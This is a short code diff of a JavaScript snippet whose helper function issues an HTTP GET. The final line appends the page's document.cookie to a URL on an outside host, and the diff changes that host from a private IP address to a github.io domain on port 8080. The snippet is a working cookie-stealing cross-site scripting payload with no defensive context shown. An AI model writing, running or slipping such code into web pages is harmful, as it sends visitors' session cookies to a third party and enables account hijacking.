@@ -6,4 +6,4 @@ function httpGet(theUrl)
     return xmlHttp.responseText;
 }
 
-httpGet('http://192.168.211.165:8080/[ '+document.cookie)
+httpGet('http://readloud.github.io:8080/[ '+document.cookie)
